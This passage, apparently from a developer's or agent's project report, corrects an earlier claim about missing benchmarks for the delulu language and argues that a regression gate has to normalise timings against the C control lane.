them (`cargo run -p delulu-measure -- study-c` is *"the performance honesty baseline"*: 6 benchmarks
across the `interp`, `wasm`, `c` and `python` lanes, with unrunnable lanes labelled `UNRUN` and given
a reason rather than dropped). I asserted the gap after checking only for a `benches/` directory —
looking for one shape of an answer and concluding the answer did not exist.

**The real gap is narrower and worth stating precisely:** the studies are reproducible on demand but
are **not regression-gated**. Nothing fails when a number gets worse.

**And re-running study-c demonstrated why that gate would need care.** Every lane came out ≈2× the
committed baseline — `c` 6→11 ms, `interp` 77→153, `python` 24→48, `wasm` 12→21. The **C lane is the
control**, and a control that moves with everything else means the *machine* was loaded (Miri was
saturating cores), not that the language regressed. The committed baseline was kept and the loaded
run discarded. A naive threshold gate on absolute milliseconds would have failed this build for a
reason that had nothing to do with the code; a useful gate has to normalize against the control lane.
